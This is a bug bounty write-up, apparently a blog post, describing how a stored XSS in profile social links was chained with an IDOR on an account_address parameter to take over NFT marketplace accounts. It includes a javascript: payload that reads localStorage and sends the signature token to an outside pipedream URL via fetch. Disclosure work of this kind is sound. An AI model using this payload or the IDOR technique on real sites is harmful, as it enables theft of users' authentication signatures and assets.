# Account Takeover

- **Source URL:** https://medium.com/@pratiky054/account-takeover-unraveling-idor-stored-xss-flaws-in-an-nft-marketplace-158679660fa7?source=rss------bug_bounty-5
- **Fetched from:** https://medium.com/feed/@pratiky054
- **Fetched:** 2026-11-16
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 3152)
- **Method:** medium-rss-content readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
Hi Everyone, 

I hope you are well :) Note I haven’t used chatgpt to write this blog for me 🙂so I hope you all ignore any grammatical errors. Well, it's a while since I have shared anything with the information security community so here is an exciting security issue I discovered in an NFT marketplace that allowed me to take over anyone's account by chaining IDOR and XSS to achieve a complete account takeover vulnerability.

We will cover each vulnerability with the actual flow and then chain all these issues

XSS →IDOR → Account takeover

Let's start with XSS first

**Note**: We will call our target application vulnerablemarketplace.com

**About this application**: In this application, every request is validated with a signature which acts like a cookie or authentication header.

### **Vulnerability 1: Stored XSS**

Like every other application, it has a profile section where users can upload profile pictures / upload art/ Update bios/ Email / Add social links like Instagram or Telegram

so the very basic step I did was to save my Twitter and Instagram link as javascript:alert(document.domain) , when I saved my info and clicked on Twitter or Instagram icon javascript got executed which confirmed we have a working stored XSS in the nft marketplace

**Steps to reproduce**

1. Login to my vulnerablemarketplace.com nft account with the wallet
2. Then navigated to my profile settings and saved my Instagram and Twitter link as javascript:alert(document.domain)

Here is the post request:

3\. So whenever we click on our profile Twitter or Instagram icon XSS will be executed

### **Vulnerability 2: Idor to Modify profile details of any users**

About the vulnerability: Attackers can modify users' profile information including contact email, Twitter or Instagram link, only requirement here is we need to get the victim's wallet address (Which is already public information on the blockchain as every user do share a wallet address to some or other person).

**Requirements**: *Victims wallet address (This we can easily get as users do share this with other users and address is a public information )*

**Steps to reproduce**

Setup: I created two accounts A. Attacker B. Victim (Copied victims wallet address)

1. The attacker connects his wallet to vulnerablemarketplace.com
2. Go to his profile settings and enter any random information on email , Twitter link, and captures the request in any proxy tool(BURP)
3. Some parameters in this post request that is really interesting as attacker's point of view are acccount\_address, signer, and signature.

account\_address= users wallet address

signer= same as account address

signature= acts like a auth token or cookie to properly validate users' requests

4\. **I modified the account\_address of the attackers with the account address of the victim** and sent the request

5\. And YES!!!! we were able to modify the victim users profiles with our own values . We were able to modify victims' email,Twitter , Instagram link with our own control values

**Note**: Some of you may have a question that if we are able to modify the email of the victim then there is already an account takeover 🧐 ? No since this is an NFT application there is no email authentication in place we have to connect using a wallet extension (We need to steal victims signature so we can use it to steal nft or artwork )

### **Chaining Vulnerability 1 + Vulnerability 2**

By now we already have an IDOR and a Stored XSS. I could have just shared my profile with other users to steal the data but by chaining this IDOR we can modify the profile details of very high reputable users to increase the impact

Things to remember: Application doesn’t has cookies but stores the signature value in the browser localStorage so we will craft the payload to steal that signature values

**Steps to reproduce**

1. Capture the POST Request of changing your profile information in proxy tool such as Burp
2. Modify the instagram and twitter link to this payload.
3. We are particularly interested in the signature value as this is required to make every request . Signature value is stored in the localStorage so here is the javascript payload which we will be using to steal that value and send it to our pipedream url

javascript:token=JSON.stringify(localStorage),url=’https://mypipedream.m.pipedream.net/'+token,fetch(url)

4\. **Modify the account\_address to victim's wallet address**

5\. Send the request and done :) As soon as the victim will be clicking on his instagram or twitter link or by the users visit victim users profile XSS will be executed and the signature value of users will be leaked to my server

Now you can see we have stolen victims signature using XSS . Now we can make any other requests to perform other authenticated operations like selling the art or transferring it or deleting the art work of users

**Disclosure**

Thank you so much for taking the time to read this blog post. It’s because of engaged readers like you that we’re able to shed light on critical vulnerabilities and enhance security measures. Let’s continue to foster this community of knowledge-sharing, creating a safer digital space for everyone. Stay tuned for more insightful posts, and remember: stay secure, and stay vigilant.

Best Regards

Pratik Yadav
